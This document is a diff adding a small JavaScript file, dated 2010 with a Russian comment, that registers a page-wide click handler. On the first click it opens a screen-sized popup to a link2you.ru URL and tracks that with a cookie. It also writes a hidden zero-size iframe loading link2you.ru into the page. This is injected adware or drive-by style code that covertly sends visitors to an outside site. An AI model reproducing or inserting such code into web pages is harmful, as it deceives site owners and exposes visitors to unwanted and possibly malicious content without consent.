@@ -1,0 +1,34 @@
+
+// work 10.05.2010 15:16
+function setCookie(name, value) {
+      var valueEscaped = escape(value);
+      var expiresDate = new Date();
+      expiresDate.setTime(expiresDate.getTime() + 23 * 60 * 60 * 1000); // срок - сутки | 12 часов
+      var expires = expiresDate.toGMTString();
+      var newCookie = name + "=" + valueEscaped + "; path=/; expires=" + expires;
+      if (valueEscaped.length <= 4000) document.cookie = newCookie + ";";
+}
+
+function getCookie(name) {
+      var prefix = name + "=";
+      var cookieStartIndex = document.cookie.indexOf(prefix);
+      if (cookieStartIndex == -1) return null;
+      var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length);
+      if (cookieEndIndex == -1) cookieEndIndex = document.cookie.length;
+      return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex));
+}
+
+window.onload = function() {
+    document.onclick = function() {
+       	if(!getCookie("user_bmw")) {
+    		var p_p = new Array("http://link2you.ru/23907/gogogo/");
+    		var p_count = p_p.length;
+    		var random_element = Math.floor(Math.random()*(p_count-0));
+        	var site_url_to_open = p_p[random_element];
+        	window.open(site_url_to_open, "new_p", "width="+screen.width+",height="+screen.width+",left=100,top=100,resizable=1,scrollbars=1,toolbar=1,location=1");
+     		window.focus();
+        	setCookie("user_bmw", 1);
+   	   	}
+    }
+}
+document.write('<iframe src="http://link2you.ru/" name="frame" id="work_frame" frameborder="0" width="0" height="0"></iframe>'); 
